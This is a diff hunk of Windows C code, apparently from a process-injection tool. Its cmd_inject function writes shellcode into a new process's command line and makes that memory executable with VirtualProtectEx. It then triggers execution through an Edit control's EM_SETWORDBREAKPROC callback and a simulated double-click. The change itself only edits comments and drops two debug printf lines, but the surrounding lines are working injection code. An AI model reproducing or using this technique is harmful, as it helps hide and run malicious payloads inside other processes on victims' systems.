@@ -178,27 +178,23 @@ void cmd_inject(PWCHAR cmd) {
     ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
     SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cmd);
     
-    // get the address of environment block in new process
-    // then calculate the address of shellcode
+    // get the address of command line in new process
+    // which contains our shellcode
     cmdline = get_cmdline(pi.hProcess, &len);
     
-    // set environment block to RWX
+    // set the address to RWX
     if(!VirtualProtectEx(pi.hProcess, cmdline, 
       len, PAGE_EXECUTE_READWRITE, &old)) {
       xstrerror(L"VirtualProtectEx(RWX)");
       goto cleanup;
     }
     
-    // create thread
-    printf("Process ID    : %ld\n", pi.dwProcessId);
-    printf("Command Line  : %p\n", cmdline);
-
     // execute shellcode
     SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)cmdline);
     SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
     SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
     
-    // set environment block to RW
+    // set command line to RW
     if(!VirtualProtectEx(pi.hProcess, cmdline, 
       len, PAGE_READWRITE, &old)) {
       xstrerror(L"VirtualProtectEx(RW)");
